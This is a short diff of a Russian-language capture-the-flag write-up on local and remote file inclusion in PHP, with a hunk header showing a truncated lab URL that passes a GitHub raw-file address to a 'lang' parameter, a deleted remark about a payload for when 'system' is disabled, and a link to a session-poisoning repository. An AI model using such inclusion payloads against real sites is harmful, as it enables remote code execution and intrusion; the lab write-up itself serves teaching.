@@ -123,5 +123,5 @@ http://lang.local/index.php?lang=https://raw.githubusercontent.com/Truncheon-eng
 ```
 Получаем флаг:
 ![](./img/photo_5273909760485354633_y.jpg)
-Второй payload можно использовать в том случае, если `system`и остальные похожие функции отключены в php.ini.
+
 [LFI_with_sess_poisoning](https://github.com/Truncheon-eng/LFI_with_sess_poisoning)
